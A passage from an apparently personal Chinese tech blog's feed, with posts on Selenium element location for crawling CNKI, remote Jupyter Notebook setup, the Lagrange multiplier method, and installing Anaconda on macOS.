class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="hljs-comment"># 不能只用域名，要使用完整url</span></span><br><span class="line">browser.get(<span class="hljs-string">'https://www.baidu.com/'</span>)</span><br></pre></td></tr></table></figure><br>接下来让我们在百度的搜索框中输入些什么进行搜索看看。<br>既然要输入，那我们首先需要找到在哪个位置进行输入，因此我们需要简单定个位，打开百度页面的源代码看一下输入框在哪。<br><img src="/2019/12/17/cnki-spider/2.png" alt="2.png"><br>我们可以发现原来这个输入框的<code>class = &quot;s_ipt&quot;</code>，那我们就先通过class来定位试试吧！<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search_input = browser.find_element_by_class_name(<span class="hljs-string">'s_ipt'</span>)</span><br><span class="line">search_input.clear()</span><br><span class="line">search_input.send_keys(<span class="hljs-string">'IR实验室'</span>)</span><br></pre></td></tr></table></figure><br><img src="/2019/12/17/cnki-spider/3.png" alt="3.png"><br>可以看到我们成功的在输入框里输入了搜索内容，下面就让我们点击一下“百度一下”搜索试试吧。<br>看一下“百度一下”按键的源码是什么：<br><img src="/2019/12/17/cnki-spider/4.png" alt="4.png"><br>可以发现它的<code>id = &quot;su&quot;</code>，那我们就通过id来定位它吧！<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser.find_element_by_id(<span class="hljs-string">'su'</span>).click()</span><br></pre></td></tr></table></figure><br><img src="/2019/12/17/cnki-spider/5.png" alt="5.png"><br>除了通过点击“百度一下”按钮，我们通常搜索的时候一般是直接按回车键的，那在这里可不可以模拟回车键呢？<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium.webdriver.common.keys <span class="hljs-keyword">import</span> Keys</span><br><span class="line"><span class="hljs-comment"># 将上面的click()那一行换作在搜索框中输入回车键</span></span><br><span class="line">search_input.send_keys(Keys.RETURN)</span><br></pre></td></tr></table></figure></p><h4 id="2-定位问题"><a href="#2-定位问题" class="headerlink" title="2. 定位问题"></a>2. 定位问题</h4><p>模拟浏览器行为无非就是模拟鼠标和键盘来操作html中的这些元素，那首要的任务就是元素定位问题了。<br>在<code>selenium</code>中提供了很多种方法可以进行元素定位，下面一一介绍。</p><h5 id="1-id定位"><a href="#1-id定位" class="headerlink" title="(1) id定位"></a>(1) id定位</h5><p><code>find_element_by_id()</code><br>例如上面的例子我们定位了“百度一下”按钮：<code>browser.find_element_by_id(&#39;su&#39;)</code></p><h5 id="2-name定位"><a href="#2-name定位" class="headerlink" title="(2) name定位"></a>(2) name定位</h5><p><code>find_element_by_name()</code><br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"s_ipt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"wd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"kw"</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">"off"</span>&gt;</span></span><br></pre></td></tr></table></figure><br>比如这是百度搜索框的源码，我们可以通过name这样定位：<code>browser.find_element_by_name(&#39;wd&#39;)</code></p><h5 id="3-class定位"><a href="#3-class定位" class="headerlink" title="(3) class定位"></a>(3) class定位</h5><p><code>find_element_by_class_name()</code><br>同样地定位搜索框：<code>browser.find_element_by_class_name(&#39;s_ipt&#39;)</code></p><h5 id="4-tag定位"><a href="#4-tag定位" class="headerlink" title="(4) tag定位"></a>(4) tag定位</h5><p><code>find_element_by_tag_name()</code><br>每一个元素本质就是一个tag，但是HTML页面的tag重复性很厉害，一般很少用这个定位。<br>例子：<code>browser.find_element_by_tag_name(&#39;input&#39;)</code></p><h5 id="5-link定位"><a href="#5-link定位" class="headerlink" title="(5) link定位"></a>(5) link定位</h5><p><code>find_element_by_link_text()</code> 可以用来定义文本链接。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://news.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>新闻<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.hao123.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>hao123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://map.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>地图<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://v.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>视频<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>我们可以通过这些文本内容打开链接：<code>browser.find_element_by_link_text(&#39;新闻&#39;).click()</code><br>也可以通过部分文本链接进行定位，也就是partial定位：<br><code>find_element_by_partial_link_text()</code><br>例子：<code>browser.find_element_by_partial_link_text(&#39;hao&#39;).click()</code></p><h5 id="6-xpath定位"><a href="#6-xpath定位" class="headerlink" title="(6) xpath定位"></a>(6) xpath定位</h5><p>它又分为绝对路径定位和相对路径定位，但我觉得没人喜欢<code>/html/*/*/</code>这样从头写路径，经常使用的也就是相对路径定位。<br><code>find_element_by_xpath(&#39;//标签[@属性名=属性值]&#39;)</code> 属性名可以是id、name、class或者其他可唯一标识该标签的元素。<br>比如上面定位百度搜索框的可以改写为：<br><code>browser.find_element_by_xpath(&#39;//input[@class=&quot;s_ipt&quot;]&#39;).send_keys(&#39;IR 实验室&#39;）</code><br><code>//</code>代表当前页面的某个路径下，<code>input</code>代表元素标签名，不指定标签可以用<code>*</code>代替。<br>既然xpath都支持路径了，那层级，也就是在某个标签之下的元素也可以通过它定位了。<br>比如，有个div标签的class=’helloworld’，然后在这个标签的里面有一个a标签，我们想要定位这个a标签就可以这么写：<br><code>browser.find_element_by_xpath(&#39;//div[@class=&quot;helloworld&quot;]/a&#39;)</code><br>更强大的是这个方法还支持通过逻辑运算符进行定位。<br>比如<code>find_element_by_xpath(&quot;//input[@id=&#39;a&#39; and @class=&#39;su&#39;]/span/input&quot;)</code></p><h5 id="7-CSS定位"><a href="#7-CSS定位" class="headerlink" title="(7) CSS定位"></a>(7) CSS定位</h5><p><code>find_element_by_css_selector()</code></p><h6 id="通过class定位"><a href="#通过class定位" class="headerlink" title="通过class定位"></a>通过class定位</h6><p>比如在百度搜索框输入要搜索的内容：<br><code>browser.find_element_by_css_selector(&quot;.s_ipt&quot;).send_keys(&#39;hello world&#39;)</code></p><h6 id="通过id定位"><a href="#通过id定位" class="headerlink" title="通过id定位"></a>通过id定位</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;#kw&quot;).send_keys(&#39;hello world&#39;)</code></p><h6 id="通过标签名定位-（很少用）"><a href="#通过标签名定位-（很少用）" class="headerlink" title="通过标签名定位 （很少用）"></a>通过标签名定位 （很少用）</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;input&quot;)</code></p><h6 id="通过标签属性定位"><a href="#通过标签属性定位" class="headerlink" title="通过标签属性定位"></a>通过标签属性定位</h6><p>例子：<br><code>browser.find_element_by_css_selector(&#39;[autocomplete=&quot;off&quot;]&#39;).send_keys(&#39;helloworld&#39;)</code><br><strong>属性值</strong>的引号可加可不加。</p><h6 id="通过标签父子关系定位"><a href="#通过标签父子关系定位" class="headerlink" title="通过标签父子关系定位"></a>通过标签父子关系定位</h6><p><code>find_element_by_css_selector(&quot;parent&gt;child&quot;)</code><br>例子：<code>browser.find_element_by_css_selector(&quot;span&gt;input&quot;).send_keys(&quot;IR 实验室&quot;)</code></p><h6 id="组合定位"><a href="#组合定位" class="headerlink" title="组合定位"></a>组合定位</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;span&gt;input#kw&quot;).send_keys(&quot;IR 实验室&quot;)</code><br>同样的，可以将属性值、id、class、父子关系等结合起来组合定位，这样可以提高定位的准确性。</p><h5 id="8-通过By定位"><a href="#8-通过By定位" class="headerlink" title="(8) 通过By定位"></a>(8) 通过By定位</h5><p>By定位元素是统一调用<code>find_element()</code>的方法。<code>find_element()</code>方法只用于定位元素，它有两个参数，第一个是定位的类型，由By提供；第二个参数是定位的具体方式。<br>使用By之前需要先导入By类：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By</span><br></pre></td></tr></table></figure><br>实例：<code>browser.find_element(By.ID,&#39;kw&#39;).send_keys(&quot;IR 实验室&quot;)</code><br>定位的类型包括：<br><code>By.ID, By.NAME, By.CLASS_NAME, By.TAG_NAME, By.LINK_TEXT, By.PARTIAL_LINK_TEXT, By.XPATH, By.CSS_SELECTOR</code></p><h4 id="3-出现定位不到元素的问题"><a href="#3-出现定位不到元素的问题" class="headerlink" title="3. 出现定位不到元素的问题"></a>3. 出现定位不到元素的问题</h4><p>你以为掌握了以上这些定位方法就没有问题了吗，当时看完教程的我也是这么想的，不就是爬取知网作者知网节嘛，当我把一切都准备好，也打开了准备爬取的页面，准备开心的开始爬的时候呢，却报错了…找不到该元素，我明明在chrome里可以看到的啊，我定位的方法也没有错啊，怎么会定位失败呢？<br>原来现在很多页面除了页面源代码之外还有很多框架源代码，而我想要爬取的内容就存在于这些框架源代码中，那这些框架源代码都在哪呢？<br><img src="/2019/12/17/cnki-spider/6.png" alt="6.png"><br>看到这些<code>iframe</code>标签了嘛，没错它们都在这里面。<br>frame标签有frameset、frame、iframe三种，frameset跟其他普通标签没有区别，不会影响到正常的定位，而frame与iframe对selenium定位而言是一样的，selenium有一组方法对frame进行操作。<br>所以我们如果想要这里面的内容就需要切换frame，之后才能定位到这些框架里的元素，那么怎么进行切换呢？<br>我们用到的函数是<code>switch_to.frame()</code>可以传入id、name、index以及selenium的WebElement对象。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.switch_to.frame(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 1.用frame的index来定位，第一个是0</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame("frame1")  # 2.用id来定位</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame("myframe")  # 3.用name来定位</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))  # 4.用WebElement对象来定位</span></span><br></pre></td></tr></table></figure><br>但是我们看到知网这个作者知网节界面不只一个框架，但这些框架都是同级的，所以我们爬完一个框架之后需要切回主文档以再切入下一个框架。<br><code>driver.switch_to.default_content()</code><br>那如果碰到一个框架里面又嵌套着框架怎么办呢？比如：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"frame1"</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"frame2"</span> / &gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>我们先从主文档一层一层的切到frame2<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.switch_to.frame(<span class="hljs-string">"frame1"</span>)</span><br><span class="line">driver.switch_to.frame(<span class="hljs-string">"frame2"</span>)</span><br></pre></td></tr></table></figure><br>现在我们从frame2怎么切换到frame1呢？<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.switch_to.parent_frame()  <span class="hljs-comment"># 如果当前已是主文档，则无效果</span></span><br></pre></td></tr></table></figure><br>有了这个方法，相当于后退作用，我们就可以随意的在frame之间切换了。</p><h3 id="三、其他常用函数补充"><a href="#三、其他常用函数补充" class="headerlink" title="三、其他常用函数补充"></a>三、其他常用函数补充</h3><h4 id="切换标签页"><a href="#切换标签页" class="headerlink" title="切换标签页:"></a>切换标签页:</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window = self.browser.window_handles <span class="hljs-comment"># 获得当前窗口句柄集合（列表类型）</span></span><br><span class="line">browser.switch_to.window(window[<span class="hljs-number">1</span>]) <span class="hljs-comment">#切换到第二个标签</span></span><br></pre></td></tr></table></figure></p><h4 id="控制浏览器前进、后退、刷新"><a href="#控制浏览器前进、后退、刷新" class="headerlink" title="控制浏览器前进、后退、刷新"></a>控制浏览器前进、后退、刷新</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browser.forward()</span><br><span class="line">browser.back()</span><br><span class="line">browser.refresh()</span><br></pre></td></tr></table></figure></p><h4 id="关闭浏览器"><a href="#关闭浏览器" class="headerlink" title="关闭浏览器"></a>关闭浏览器</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>如果你想获取完整的爬取知网作者知网节的代码:<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/spider_cnki</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇主要介绍基于Chrome的webdriver进行爬虫的基本方法，整理下来以备遗忘。&lt;/p&gt;
    
    </summary>
    
    
      <category term="爬虫系列" scheme="https://fansblog.club/categories/%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>服务器配置jupyter notebook实现远程访问</title>
    <link href="https://fansblog.club/2019/12/14/remote-jupyternotebook/"/>
    <id>https://fansblog.club/2019/12/14/remote-jupyternotebook/</id>
    <published>2019-12-14T08:52:40.000Z</published>
    <updated>2019-12-14T09:48:19.009Z</updated>
    
    <content type="html"><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p><h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p><h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p><h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p><h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;jupyter notebook&lt;/code&gt;简单配置，随手记录，以备遗忘。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>拉格朗日乘数法</title>
    <link href="https://fansblog.club/2019/12/09/langrange-multi-approach/"/>
    <id>https://fansblog.club/2019/12/09/langrange-multi-approach/</id>
    <published>2019-12-09T05:50:38.000Z</published>
    <updated>2019-12-09T09:05:27.589Z</updated>
    
    <content type="html"><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p><h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p><h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p><p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p><h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p><h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>Mac下命令行版本的Anaconda安装及常用命令</title>
    <link href="https://fansblog.club/2019/12/03/anaconda-installformac/"/>
    <id>https://fansblog.club/2019/12/03/anaconda-installformac/</id>
    <published>2019-12-03T07:59:01.000Z</published>
    <updated>2020-02-23T09:54:10.824Z</updated>
    
    <content type="html"><![CDATA[<p>简单记录一下在Mac下Anaconda安装的过程<a id="more"></a></p><p>一开始的我对Anaconda总是拒绝的，大概是因为自己固步自封不喜欢接受新事物(虽然这也不是新东西啊…)<br>在之前我一直都是用什么包直接<code>pip install xxx</code>完事。<br>直到很久之前某一天发现，为某个项目单独配置一个新的编码环境，各自独立是多么的幸福，用完也可以把这个环境全部删除，对本身的环境丝毫不影响，但无奈于我这个小废物一直很懒，直到今天才想起来安装一下Anaconda。</p><h3 id="1-下载命令行版本安装包"><a href="#1-下载命令行版本安装包" class="headerlink" title="1. 下载命令行版本安装包"></a>1. 下载命令行版本安装包</h3><p><a href="https://www.anaconda.com/download/#macos" target="_blank" rel="noopener">官网地址</a></p><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h3><p>cd到下载目录，输入以下命令直接安装即可<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash Anaconda3-2019.10-MacOSX-x86_64.sh</span><br></pre></td></tr></table></figure><br>之后一直回车即可（有一步让你同意什么什么协议，输入<code>yes</code>即可）</p><h3 id="3-添加环境变量"><a href="#3-添加环境变量" class="headerlink" title="3.添加环境变量"></a>3.添加环境变量</h3><p>编辑<code>.bash_profile</code><br>mac下可以用<code>open</code>命令<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open ~/.bash_profile</span><br></pre></td></tr></table></figure><br>添加一行<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/Users/yourname/anaconda3/bin:<span class="hljs-variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure><br>上面的路径要输入你对应的路径名<br>刷新生效<code>source</code><br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span 